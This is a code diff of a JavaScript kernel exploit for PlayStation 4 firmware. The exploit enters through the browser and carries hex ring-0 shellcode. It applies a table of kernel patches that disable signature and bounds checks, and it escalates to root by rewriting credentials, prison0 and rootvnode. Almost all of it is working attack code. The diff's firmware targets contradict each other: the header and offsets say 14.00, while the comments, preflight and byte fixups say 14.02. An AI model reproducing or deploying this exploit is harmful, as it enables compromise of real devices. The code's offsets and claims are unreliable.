@@ -1,5 +1,5 @@
 /*
-    afterglow -- PlayStation 4 kernel exploit for firmware 14.02 (Encore build)
+    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
     Port to the raw13 host (WebKit entry), from the Lua original.
 
     Copyright (C) 2026 well0nez
@@ -27,14 +27,10 @@ const S = {
   cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
-/* offsets into the kernel image, firmware 14.02
-   anchor:    verified — Akatsuki + runtime grid-shift confirms 0xe6c30 for 14.02
-   swap_rbp:  verified — kernel_1402.bin byte 4e95c3 at 0xa81478, NOT at 14.00's 0xa80f68
-   prison0:   verified — data segment, unchanged 12.00–14.02 (KTM, Scene-Collective, Pharaoh2k)
-   rootvnode: verified — data segment, unchanged 12.00–14.02 (KTM, Scene-Collective, Pharaoh2k) */
+/* offsets into the kernel image, firmware 14.00 */
 const K = {
   anchor:    0x00e6c30,
-  swap_rbp:  0x0a81478,
+  swap_rbp:  0x0a80f68,
   prison0:   0x111fa18,
   rootvnode: 0x2136e90,
 };
@@ -74,40 +70,33 @@ const TUNE = {
 
 const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];
 
-/* BOOTSTRAP — position-independent ring-0 shellcode.
-   14.02 change vs 14.00: mmap protection immediates shifted +0x400
-     14.00: c681 daaa1f00 37 → mov byte [rcx+0x1faada], 0x37
-     14.02: c681 daae1f00 37 → mov byte [rcx+0x1faeda], 0x37
-   Verified: kernel_1402.bin @ 0x1faeda = stock 0x33, final 0x37 (KTM preflight)
-   All other BOOTSTRAP addresses (0x490, 0x4b5, 0x4b9, 0x4c2, 0xab4,
-   sysent @ 0x1102d80/d88/dac) unchanged on 14.02 (KTM preflight confirms). */
 const BOOTSTRAP =
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
   + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
   + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-  + "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
+  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
   + "20c0480d000001000f22c031c0c3";
 
-/* PATCHES — 14.02 verified addresses with stock-byte guards.
-   Sources: KTM preflight-1402.js (live PS4 scan) + kernel_1402.bin (ELF dump)
-   Format: [rva, final_hex, stock_hex, label]
-   stock_hex added for guard: ABORT if current bytes ≠ stock AND ≠ final */
+/* Firmware 14.02 only: offsets measured against the supplied clean 14.02 kernel ELF.
+ * Entry 4 is the ORIGINAL byte string required before overwriting. Browser
+ * firmware is already restricted to 14.02 by attempt()'s preflight.
+ * This is an experimental code port, NOT a hardware-validated patch table. */
 const PATCHES = [
-  [0x0000acd, "eb",       "76", "bcopy"],              // shift 0 from 14.00
-  [0x02bda9d, "eb",       "76", "bzero"],              // shift +0x300
-  [0x02bdae1, "eb",       "76", "pagezero"],           // shift +0x300
-  [0x02bdb5d, "eb",       "76", "memcpy"],             // shift +0x300
-  [0x02bdba1, "eb",       "76", "pagecopy"],           // shift +0x300
-  [0x02bdd4d, "eb",       "76", "copyin"],             // shift +0x300
-  [0x02be1fd, "eb",       "76", "copyinstr"],          // shift +0x300
-  [0x02be2cd, "eb",       "76", "copystr"],            // shift +0x300
-  [0x01b7c63, "eb04",     "0f85", "dlsym, first check"],   // shift +0x220
-  [0x01b7c73, "eb04",     "0f84", "dlsym, second check"],  // shift +0x220
-  [0x01b7c93, "90e9",     "0f84", "dlsym, nop and jump"],  // shift +0x220
-  [0x01b7724, "90e9",     "0f84", "load_prx"],             // shift +0x220
-  [0x01b7cd8, "90e93c01", "0f82", "dlsym, open it to every caller"], // shift +0x220
-  [0x0628b04, "eb00",     "74",   "self verification"],     // shift +0x480
-  [0x06293ef, "eb00",     "75",   "delayed panic on suspend"], // shift +0x480
+  [0x0000acd, "eb", "bcopy", "76"],
+  [0x02bda9d, "eb", "bzero", "76"],
+  [0x02bdae1, "eb", "pagezero", "76"],
+  [0x02bdb5d, "eb", "memcpy", "76"],
+  [0x02bdba1, "eb", "pagecopy", "76"],
+  [0x02bdd4d, "eb", "copyin", "76"],
+  [0x02be1fd, "eb", "copyinstr", "76"],
+  [0x02be2cd, "eb", "copystr", "76"],
+  [0x01b7c63, "eb04", "dlsym, first check", "0f85"],
+  [0x01b7c73, "eb04", "dlsym, second check", "0f84"],
+  [0x01b7c93, "90e9", "dlsym, nop and jump", "0f84"],
+  [0x01b7724, "90e9", "load_prx", "0f84"],
+  [0x01b7cd8, "90e93c01", "dlsym, open it to every caller", "0f823901"],
+  [0x0628b04, "eb00", "self verification", "7407"],
+  [0x06293ef, "eb00", "delayed panic on suspend", "7541"],
 ];
 
 const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };
@@ -117,36 +106,13 @@ function host() {
   return STATE.ctx;
 }
 
-/* Full diagnostic log — every line goes to the server and to console */
-const LOG_BUFFER = [];
 function say(fmt) {
-  const ts = (typeof performance !== "undefined" ? performance.now().toFixed(1) : "?");
-  const line = "[" + ts + "ms] " + fmt;
-  LOG_BUFFER.push(line);
-  host().mark("AG", line);
+  host().mark("AG", fmt);
   try {
-    fetch("ag_log?m=" + encodeURIComponent(line), { keepalive: true }).catch(function () {});
+    if (/^\[(e|g|p|t|7b|7|8|9|10|kp|rw)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
+      fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
+    }
   } catch (e) {}
-}
-
-function sayHex(label, bytes, maxLen) {
-  if (!bytes) { say(label + " NULL"); return; }
-  maxLen = maxLen || 32;
-  var hex = "";
-  for (var i = 0; i < Math.min(bytes.length, maxLen); i++) {
-    hex += bytes[i].toString(16).padStart(2, "0");
-  }
-  if (bytes.length > maxLen) hex += "...(" + bytes.length + "B)";
-  say(label + " " + hex);
-}
-
-function dumpState(tag) {
-  say("[DIAG:" + tag + "] K.anchor=0x" + K.anchor.toString(16)
-      + " K.swap_rbp=0x" + K.swap_rbp.toString(16)
-      + " K.prison0=0x" + K.prison0.toString(16)
-      + " K.rootvnode=0x" + K.rootvnode.toString(16));
-  say("[DIAG:" + tag + "] shots_fired=" + (STATE.base ? "base_known" : "no_base")
-      + " retry=" + STATE.retry);
 }
 
 const LOW = 0x100000000;
@@ -362,8 +328,6 @@ function shooter(gad) {
       this.why = "no apm unit among 0.." + TUNE.ceiling
                  + " (" + Object.keys(STATE.units).length + " spent, refusals "
                  + refused.join(" ") + ")";
-      say("[APM:DBG] all units busy/spent. spent=" + JSON.stringify(Object.keys(STATE.units))
-          + " errno_last=" + host().errno());
       return null;
     }
     STATE.units[unit] = true;
@@ -967,11 +931,17 @@ async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  STATE.units = {};
-  STATE.clones = 0;
-  STATE.base = null;
-  STATE.batch = undefined;
-  say("afterglow -- ps4 kernel exploit, firmware 14.02 only (Encore build, direct offsets)");
+  say("Akatsuki KERNEL PORT v3: HEN184 FW 14.02; clean-kernel 15-site byte guard");
+  if (!/PlayStation\s+4[\/ ]14\.02(?![0-9])/i.test(navigator.userAgent || "")) {
+    say("[preflight] Unsupported user agent; refusing to run exploit");
+    return false;
+  }
+  const preflightHen = await fetchBytes("hen-1402-source.bin", "preflight");
+  if (!preflightHen || preflightHen.length !== 501152 || preflightHen[0] !== 0xE9) {
+    say("[preflight] Official HEN184 file missing, corrupted, or unexpected format; no kernel operations performed");
+    return false;
+  }
+  say("[preflight] HEN184 file served, size and format OK (hash was checked on PC startup)");
 
   const missing = seedStubs();
   if (missing.length) {
@@ -1081,21 +1051,16 @@ async function attempt(ctx, opts) {
         + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
     if (!found) {
       if (r === null && shot.sprayed === 0) {
-        say("[1] ✗ no free apm unit left — this boot is spent, reboot the console.");
+        say("    no free apm unit left -- this boot is spent, reboot the console.");
       } else {
-        say("[1] ✗ the spray did not take — retryable");
+        say("    the spray did not take");
         STATE.retry = true;
       }
-      dumpState("LEAK-FAIL");
       return false;
     }
     kbase = plus(found, -K.anchor);
     STATE.base = kbase;
-    say("[1] ✓ kernel base: " + text(kbase));
-    say("[1]   anchor RVA:  0x" + K.anchor.toString(16));
-    say("[1]   anchor abs:  " + text(found));
-    say("[1]   base check:  " + text(kbase) + " + 0x" + K.anchor.toString(16)
-        + " = " + text(plus(kbase, K.anchor)));
+    say("    base " + text(kbase));
   }
 
   {
@@ -1111,43 +1076,25 @@ async function attempt(ctx, opts) {
       c.grab(scanBuf.at, SCAN_WIN);
     }, 0x400);
 
-    say("[1b] ---- SWAP_RBP GADGET SCAN ----");
-    say("[1b] expected at RVA 0x" + K.swap_rbp.toString(16) + " (xchg rbp,rax; ret = 4e 95 c3)");
-    say("[1b] scanning window: " + text(plus(kbase, K.swap_rbp - SCAN_PRE))
-        + " to " + text(plus(kbase, K.swap_rbp - SCAN_PRE + SCAN_WIN)));
-    say("[1b] gadget scan: " + (scanR === null ? ("null — " + shot.why) : ("chain=" + scanR)));
+    say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));
 
     if (ran(scanR)) {
       const sb = rdbuf(scanBuf.at, SCAN_WIN);
       let hit = -1;
-      let allHits = [];
       for (let i = 0; i < SCAN_WIN - 2; i++) {
-        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) {
-          allHits.push(i);
-          if (hit < 0) hit = i;
-        }
+        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) { hit = i; break; }
       }
-      say("[1b] pattern 4e95c3 found " + allHits.length + " time(s) in window");
       if (hit >= 0) {
         const realRVA = K.swap_rbp - SCAN_PRE + hit;
         const delta = realRVA - K.swap_rbp;
-        say("[1b] ✓ swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
-            + " abs=" + text(plus(kbase, realRVA))
-            + (delta !== 0 ? (" SHIFTED by " + delta + " bytes!") : " (matches expected)"));
-        if (delta !== 0) {
-          say("[1b] ⚠ ADJUSTED K.swap_rbp: 0x" + K.swap_rbp.toString(16)
-              + " → 0x" + realRVA.toString(16));
-        }
+        say("[1b] swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
+            + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
         K.swap_rbp = realRVA;
       } else {
-        say("[1b] ✗ swap_rbp pattern 4e95c3 NOT FOUND in " + SCAN_WIN + " byte window!");
-        say("[1b] ✗ using original 0x" + K.swap_rbp.toString(16) + " — EXPECT CRASH");
-        dumpState("SWAP-MISS");
+        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
       }
     } else {
-      say("[1b] ✗ scan shot missed — could not read kernel memory for gadget scan");
-      say("[1b] using original K.swap_rbp = 0x" + K.swap_rbp.toString(16));
-      dumpState("SWAP-NOREAD");
+      say("[1b] scan shot missed -- using original K.swap_rbp");
     }
   }
 
@@ -1224,9 +1171,7 @@ async function attempt(ctx, opts) {
   const file = qAt(note, 40), ops = qAt(note, 48);
   say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
   if (!inHeap(file) || !inText(ops)) {
-    say("    handles implausible -- nothing written");
-    say("[3:DBG] file=" + text(file) + " inHeap=" + inHeap(file) + " ops=" + text(ops) + " inText=" + inText(ops));
-    STATE.retry = true; return false;
+    say("    handles implausible -- nothing written"); STATE.retry = true; return false;
   }
 
   let sane = 0;
@@ -1267,16 +1212,8 @@ async function attempt(ctx, opts) {
     const below = hostPage.hi < upto.hi || (hostPage.hi === upto.hi && hostPage.low < upto.low);
     if (above && below) { hit = k; break; }
   }
-  if (hit === null) {
-    say("[4] no mapping covers the host page, " + walked + " walked");
-    say("[4:DBG] hostPage=" + text(hostPage) + " reach=" + reach + " maps.at=" + text(maps.at));
-    for (let d = 0; d < Math.min(walked, 5); d++) {
-      var df = qAt(maps, d * TUNE.stride + 0x20), du = qAt(maps, d * TUNE.stride + 0x28);
-      say("[4:DBG]   map[" + d + "] from=" + text(df) + " upto=" + text(du));
-    }
-    STATE.retry = true; return false;
-  }
-  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); STATE.retry = true; return false; }
+  if (hit === null) { say("[4] no mapping covers the host page, " + walked + " walked"); return false; }
+  if (hit === 0) { say("[4] the host page is the first mapping -- cannot address it"); return false; }
 
   const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
   const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
@@ -1287,7 +1224,7 @@ async function attempt(ctx, opts) {
       + " ceiling=0x" + ceiling.toString(16));
   if (locked % 2 === 1 || !inHeap(here) || now === 0 || ceiling === 0
       || Math.floor(now / 4) % 2 !== 1) {
-    say("    not the mapping we want -- nothing written"); STATE.retry = true; return false;
+    say("    not the mapping we want -- nothing written"); return false;
   }
 
   let widened = rights;
@@ -1307,53 +1244,21 @@ async function attempt(ctx, opts) {
   if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
     say("    page did not turn writable -- not calling into it"); return false;
   }
-  say("[5] ---- BOOTSTRAP SETUP ----");
   const boot = unhex(BOOTSTRAP);
-  say("[5] bootstrap shellcode: " + boot.length + " bytes");
-
-  /* 14.02 BOOTSTRAP verification — check all hardcoded addresses */
-  {
-    say("[5] verifying bootstrap addresses:");
-
-    /* mmap immediates must be at 0x1faeda (14.02), NOT 0x1faada (14.00) */
-    let aeCount = 0;
-    let aaCount = 0;
+  if (K.anchor === 0xe6c30) {
     for (let bi = 0; bi < boot.length - 6; bi++) {
-      if (boot[bi] === 0xc6 && boot[bi + 1] === 0x81 && boot[bi + 4] === 0x1f
-          && boot[bi + 5] === 0x00 && boot[bi + 6] === 0x37) {
-        if (boot[bi + 3] === 0xae) {
-          aeCount++;
-          say("[5]   mmap imm write @ bootstrap+" + bi + ": daae1f → 14.02 ✓");
-        } else if (boot[bi + 3] === 0xaa) {
-          aaCount++;
-          say("[5]   mmap imm write @ bootstrap+" + bi + ": daaa1f → 14.00 ✗ WRONG FW!");
-        }
+      if (boot[bi] === 0xc6 && boot[bi+1] === 0x81 && boot[bi+3] === 0xaa
+          && boot[bi+4] === 0x1f && boot[bi+5] === 0x00 && boot[bi+6] === 0x37) {
+        boot[bi+3] = 0xae;
+        say("[5b] bootstrap fixup: offset byte at +" + bi + " shifted aa->ae (+0x400)");
       }
     }
-    say("[5]   daae (14.02): " + aeCount + "  daaa (14.00): " + aaCount);
-    if (aeCount !== 2 || aaCount !== 0) {
-      say("[5] ABORT: bootstrap has wrong mmap immediates for 14.02");
-      dumpState("BOOTSTRAP-BAD");
-      return false;
-    }
-
-    /* sysent[11] address: 0x1102d80 (narg), 0x1102d88 (call), 0x1102dac (thrcnt) */
-    say("[5]   sysent[11].sy_narg target: 0x1102d80 (SYSENT_RVA=0x1102b70 + 11*0x30=0x210)");
-    say("[5]   sysent[11].sy_call target: 0x1102d88");
-    say("[5]   syscall gate slot:         0x0ab4");
-    say("[5]   mmap maxprot:              0x0490");
-    say("[5]   mmap branches:             0x04b5, 0x04b9, 0x04c2");
   }
 
   wrbuf(hostFree, boot);
-  const bootBack = rdbuf(hostFree, boot.length);
-  if (!sameBytes(bootBack, boot)) {
-    say("[5] bootstrap did not stick — write verification failed");
-    sayHex("[5]   wrote", boot, 20);
-    sayHex("[5]   read ", bootBack, 20);
-    return false;
+  if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
+    say("    bootstrap did not stick"); return false;
   }
-  say("[5] bootstrap written and verified (" + boot.length + " bytes) ✓");
 
   const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
   const before = sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32;
@@ -1389,13 +1294,10 @@ async function attempt(ctx, opts) {
 
   const failOut = function (why) {
     say(why);
-    dumpState("FAIL");
     try {
       const p0 = k.read_v(plus(thread, 0x08));
       const f0 = p0 && k.read_v(plus(p0, 0x48));
       const o0 = f0 && k.read_v(f0);
-      say("[FAIL] proc=" + (p0 ? text(p0) : "null") + " fdt=" + (f0 ? text(f0) : "null")
-          + " ofs=" + (o0 ? text(o0) : "null"));
       if (o0 && inHeap(o0)
           && teardown(k, kbase, o0, shot.devs, shot.queues, hostFree))
         say("handles defused after the failure -- this page may close");
@@ -1407,215 +1309,67 @@ async function attempt(ctx, opts) {
     return false;
   };
 
-  /* ================================================================
-     STEP 7: PATCH RESOLUTION — auto-scan + stock-byte guard
-     PATCHES format: [rva, final_hex, stock_hex, label]
-
-     For each site:
-       1. Read current bytes at our verified 14.02 RVA
-       2. If final bytes → already patched on a previous run, skip
-       3. If stock bytes → correct address, ready to patch
-       4. If NEITHER → auto-scan nearby with SHIFTS to find the site
-       5. If auto-scan fails too → ABORT (wrong kernel)
-     ================================================================ */
-  say("[7] ---- PATCH RESOLUTION: " + PATCHES.length + " sites ----");
-  say("[7] kernel base: " + text(kbase));
-  {
-    /* Shifts observed between 14.00 and 14.02 kernel builds.
-       0x000 = no shift (bcopy), 0x300 = bzero group, 0x220 = dlsym group,
-       0x480 = self_verify group. Others are fallback candidates. */
-    const SHIFTS = [0, 0x10, 0x220, 0x300, 0x360, 0x370, 0x3E0, 0x400, 0x480, 0x4B0, 0x500];
-    let ready = 0, skipped = 0, scanned = 0, blocked = 0;
-
-    for (let i = 0; i < PATCHES.length; i++) {
-      const off = PATCHES[i][0];
-      const nb = unhex(PATCHES[i][1]);
-      const sb = unhex(PATCHES[i][2]);
-      const label = PATCHES[i][3];
-      const readLen = Math.max(nb.length, sb.length, 4);
-      const cur = k.read(kat(off), readLen);
-
-      if (!cur) {
-        say("[7] " + label + " @ 0x" + off.toString(16) + " ✗ UNREADABLE (kernel read failed)");
-        blocked++;
-        continue;
-      }
-
-      const curHex = Array.from(cur.slice(0, readLen)).map(function(x) {
-        return x.toString(16).padStart(2, "0");
-      }).join("");
-
-      /* Check 1: already patched? */
-      if (sameBytes(cur.slice(0, nb.length), nb)) {
-        say("[7] " + label + " @ 0x" + off.toString(16) + " ✓ FINAL (already patched)"
-            + " bytes=" + curHex);
-        skipped++;
-        continue;
-      }
-
-      /* Check 2: stock bytes match? */
-      let stockOk = true;
-      for (let j = 0; j < sb.length && j < cur.length; j++) {
-        if (cur[j] !== sb[j]) { stockOk = false; break; }
-      }
-
-      if (stockOk) {
-        say("[7] " + label + " @ 0x" + off.toString(16) + " ✓ STOCK (ready to patch)"
-            + " bytes=" + curHex + " expected=" + PATCHES[i][2]);
-        ready++;
-        continue;
-      }
-
-      /* Check 3: auto-scan with SHIFTS */
-      say("[7] " + label + " @ 0x" + off.toString(16) + " ≠ stock or final"
-          + " got=" + curHex + " stock=" + PATCHES[i][2] + " final=" + PATCHES[i][1]);
-      say("[7] → scanning " + SHIFTS.length + " shift offsets...");
-
-      let found = -1;
-      for (let s = 0; s < SHIFTS.length; s++) {
-        if (SHIFTS[s] === 0) continue; /* already checked at 0 */
-        const tryAddr = off + SHIFTS[s];
-        const tryBytes = k.read(kat(tryAddr), sb.length);
-        if (!tryBytes) continue;
-        let match = true;
-        for (let j = 0; j < sb.length; j++) {
-          if (tryBytes[j] !== sb[j]) { match = false; break; }
-        }
-        if (match) {
-          found = SHIFTS[s];
-          say("[7] → FOUND at +" + found + " (0x" + found.toString(16)
-              + ") → new RVA 0x" + tryAddr.toString(16));
-          PATCHES[i][0] = tryAddr;
-          scanned++;
-          break;
-        }
-      }
-
-      if (found < 0) {
-        /* Also try negative shifts */
-        for (let s = 1; s < SHIFTS.length; s++) {
-          if (SHIFTS[s] > off) continue;
-          const tryAddr = off - SHIFTS[s];
-          const tryBytes = k.read(kat(tryAddr), sb.length);
-          if (!tryBytes) continue;
-          let match = true;
-          for (let j = 0; j < sb.length; j++) {
-            if (tryBytes[j] !== sb[j]) { match = false; break; }
-          }
-          if (match) {
-            found = -SHIFTS[s];
-            say("[7] → FOUND at " + found + " (0x-" + SHIFTS[s].toString(16)
-                + ") → new RVA 0x" + tryAddr.toString(16));
-            PATCHES[i][0] = tryAddr;
-            scanned++;
-            break;
-          }
-        }
-      }
-
-      if (found < 0) {
-        say("[7] ✗ " + label + " UNRESOLVED — stock bytes not found at any shift");
-        say("[7]   expected stock: " + PATCHES[i][2]);
-        say("[7]   actual at RVA:  " + curHex);
-        blocked++;
-      }
-    }
-
-    say("[7] PATCH RESOLUTION COMPLETE:");
-    say("[7]   " + ready + " stock-verified (ready)");
-    say("[7]   " + skipped + " already patched (skip)");
-    say("[7]   " + scanned + " auto-scanned (relocated)");
-    say("[7]   " + blocked + " BLOCKED (unresolved)");
-
-    if (blocked > 0) {
-      return failOut("[7] " + blocked + " patch site(s) unresolved — ABORTING to prevent kernel damage");
-    }
+  // Verify every 14.02 patch site against the pristine 14.02 kernel dump.
+  // Never scan for a single branch byte and "shift" to an arbitrary neighbor.
+  // Either all 15 sites are recognized, or no 15-site patching occurs.
+  let originalSites = 0, alreadySites = 0;
+  for (let i = 0; i < PATCHES.length; i++) {
+    const off = PATCHES[i][0];
+    const next = unhex(PATCHES[i][1]);
+    const orig = unhex(PATCHES[i][3]);
+    const cur = k.read(kat(off), orig.length);
+    if (cur && sameBytes(cur, orig)) { originalSites++; continue; }
+    if (cur && sameBytes(cur, next)) { alreadySites++; continue; }
+    say("[7b] BLOCKED " + PATCHES[i][2] + " at 0x" + off.toString(16)
+        + " read=" + (cur ? Array.from(cur).map(x => x.toString(16).padStart(2, "0")).join("") : "unreadable")
+        + " expected=" + PATCHES[i][3] + " or " + PATCHES[i][1]);
+    return failOut("[7b] 14.02 kernel signature mismatch -- NO kernel patch pass run");
   }
+  say("[7b] 14.02 kernel patch preflight PASS: " + originalSites
+      + " original, " + alreadySites + " already matching; no heuristic offsets used");
 
-  /* ---- STEP 8: apply patches and verify ---- */
-  say("[8] applying " + PATCHES.length + " kernel patches...");
   if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
-
   let done = 0, failed = null;
-  say("[8] verifying patches...");
   for (let i = 0; i < PATCHES.length; i++) {
     const bytes = unhex(PATCHES[i][1]);
     const got = k.read(kat(PATCHES[i][0]), bytes.length);
-    const gotHex = got ? Array.from(got).map(function(x) {
-      return x.toString(16).padStart(2, "0");
-    }).join("") : "null";
-
-    if (got && sameBytes(got, bytes)) {
-      say("[8] ✓ " + PATCHES[i][3] + " @ 0x" + PATCHES[i][0].toString(16) + " = " + gotHex);
-      done++;
-    } else {
-      say("[8] ✗ " + PATCHES[i][3] + " @ 0x" + PATCHES[i][0].toString(16)
-          + " MISMATCH: got=" + gotHex + " expected=" + PATCHES[i][1]);
-      if (!failed) failed = PATCHES[i][3];
-    }
+    if (got && sameBytes(got, bytes)) done++; else failed = failed || PATCHES[i][2];
   }
-  say("[8] " + done + " of " + PATCHES.length + " kernel patches verified"
-      + (failed ? (" — FIRST FAIL: " + failed) : " — ALL OK"));
+  say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
+      + (failed ? (" -- first missing: " + failed) : ""));
   if (done < PATCHES.length) { return failOut("     refusing to go on with a half patched kernel"); }
 
-  /* ---- STEP 9: sandbox escape + privilege escalation ---- */
-  say("[9] ---- SANDBOX ESCAPE ----");
-
   const proc = k.read_v(plus(thread, 0x08));
-  say("[9] proc: " + (proc ? text(proc) : "NULL"));
   const fdt = proc && k.read_v(plus(proc, 0x48));
-  say("[9] fdt:  " + (fdt ? text(fdt) : "NULL"));
   const ofs = fdt && k.read_v(fdt);
-  say("[9] ofs:  " + (ofs ? text(ofs) : "NULL"));
-  if (!ofs || !inHeap(ofs)) {
-    say("[9] descriptor table unreadable — proc/fdt chain broken");
-    return failOut("[9] descriptor table unreadable");
-  }
+  if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }
 
   const ucred = proc && k.read_v(plus(proc, 0x40));
-  say("[9] ucred: " + (ucred ? text(ucred) : "NULL"));
   if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }
 
-  /* zero uid/gid fields */
-  say("[9] zeroing uid/gid fields at ucred+0x04,0x08,0x0c,0x14...");
   const z4 = new Uint8Array([0, 0, 0, 0]);
   const offs = [0x04, 0x08, 0x0c, 0x14];
   for (let i = 0; i < offs.length; i++) k.write(plus(ucred, offs[i]), z4);
-  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));   /* cr_ngroups */
-  say("[9] uid/gid zeroed ✓");
+  k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0]));
 
-  /* prison0 — sandbox escape */
-  say("[9] reading prison0 @ K.prison0=0x" + K.prison0.toString(16) + "...");
   const prison0 = k.read_v(kat(K.prison0));
-  say("[9] prison0 value: " + (prison0 ? text(prison0) : "NULL"));
   if (!prison0 || !inText(prison0)) {
     return failOut(
       "[9] prison0 pointer is " + (prison0 ? text(prison0) : "unreadable")
-        + " (expected kernel text range) — not touching credentials",
+        + " -- not touching credentials",
     );
   }
-  k.write_v(plus(ucred, 0x30), prison0);                      /* cr_prison */
-  say("[9] cr_prison set to prison0 ✓");
+  k.write_v(plus(ucred, 0x30), prison0);
   const caps = new Uint8Array(16); caps.fill(0xff);
-  k.write(plus(ucred, 0x60), caps);                            /* sceCaps */
-  say("[9] sceCaps set to 0xFF ✓");
+  k.write(plus(ucred, 0x60), caps);
 
-  /* rootvnode — filesystem escape */
-  say("[9] reading rootvnode @ K.rootvnode=0x" + K.rootvnode.toString(16) + "...");
   const rootvnode = k.read_v(kat(K.rootvnode));
-  say("[9] rootvnode value: " + (rootvnode ? text(rootvnode) : "NULL"));
   if (!rootvnode || !inHeap(rootvnode)) { return failOut("[9] rootvnode is not set"); }
-  k.write_v(plus(fdt, 0x10), rootvnode);                       /* fd_rdir */
-  k.write_v(plus(fdt, 0x18), rootvnode);                       /* fd_jdir */
-  say("[9] fd_rdir + fd_jdir set to rootvnode ✓");
+  k.write_v(plus(fdt, 0x10), rootvnode);
+  k.write_v(plus(fdt, 0x18), rootvnode);
 
-  /* verify root */
-  const myuid = sc(S.getuid).i32;
-  say("[9] getuid() = " + myuid);
-  if (myuid !== 0) {
-    return failOut("[9] still not root (uid=" + myuid + ") — privilege escalation failed");
-  }
-  say("[9] ✓ JAILBROKEN — uid 0, sandbox escaped, filesystem rooted");
+  if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
+  say("[9] jailbroken, uid 0");
 
   const iface = {
     base: kbase,
@@ -1652,164 +1406,34 @@ async function attempt(ctx, opts) {
   iface.queues = shot.queues;
   if (ctx.state) ctx.state.afterglow = iface;
 
-  say("[10] ---- KERNEL INTERFACE ----");
-  say("[10] kernel interface is live — " + shot.devs.length + " handles held open");
-  say("[10] base: " + text(kbase));
-  say("[10] thread: " + text(thread));
-  say("[10] proc: " + text(proc));
-  say("[10] total APM shots used: " + shot.fired);
+  say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");
 
   iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
   say(iface.defused
       ? "handles defused -- this page may close"
       : "the handles are NOT defused -- do not let this page close");
 
-  (function () {
-    var TEXT_SIZE = 0xCFE880;
-    var DATA_OFF  = 0x1520000;
+  // Firmware 14.02 port: do NOT apply the old unvalidated debug-menu
+  // RCMgr kernel-code mutations. This feature is not required to initialize HEN.
 
-    var c = k.begin();
-    c.hex("48bf").qw(kbase);
-    c.hex("48be").qw(plus(kbase, TEXT_SIZE));
-    c.hex("48ba").qw(v(0x676d6372, 0x65645f72));
-    c.hex("4839f7").hex("730b");
-    c.hex("483917").hex("740b");
-    c.hex("4883c701").hex("ebf0");
-    c.hex("4831c0").hex("eb03");
-    c.hex("4889f8");
-    c.hex("49ba").qw(plus(k.at, OUT));
-    c.hex("498902");
-    if (!k.run()) return;
-    var strAddr = k.out();
-    if (!strAddr || isZero(strAddr)) return;
-
-    var tail = k.read(plus(strAddr, 8), 8);
-    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) return;
-
-    var c2 = k.begin();
-    c2.hex("48bf").qw(plus(kbase, DATA_OFF));
-    c2.hex("48be").qw(plus(kbase, DATA_OFF + 0x700000));
-    c2.hex("48ba").qw(strAddr);
-    c2.hex("4839f7").hex("730b");
-    c2.hex("483917").hex("740b");
-    c2.hex("4883c708").hex("ebf0");
-    c2.hex("4831c0").hex("eb03");
-    c2.hex("4889f8");
-    c2.hex("49ba").qw(plus(k.at, OUT));
-    c2.hex("498902");
-    if (!k.run()) return;
-    var hit = k.out();
-    if (!hit || isZero(hit)) return;
-
-    var fn = k.read_v(plus(hit, 0x08));
-    if (!fn || isZero(fn)) return;
-    var fnRva = (fn.low - kbase.low) >>> 0;
-    if (fnRva >= TEXT_SIZE) return;
-
-    var body = k.read(fn, 80);
-    if (!body) return;
-
-    var target = null;
-    for (var i = 0; i < body.length - 6; i++) {
-      if (body[i] === 0xe8 && body[i + 5] === 0x85) {
-        var d = body[i+1] | (body[i+2]<<8) | (body[i+3]<<16) | (body[i+4]<<24);
-        if (d >= 0x80000000) d -= 0x100000000;
-        var ct = fnRva + i + 5 + d;
-        if (ct > 0 && ct < TEXT_SIZE) {
-          target = ct;
-          say("[dbg] rcmgr check at rva 0x" + ct.toString(16));
-          break;
-        }
-      }
-    }
-
-    if (target === null) { say("[dbg] no CALL+TEST in handler"); return; }
-
-    var target2 = null;
-    for (var j = i + 5; j < body.length - 6; j++) {
-      if (body[j] === 0xe8 && body[j + 5] === 0x85) {
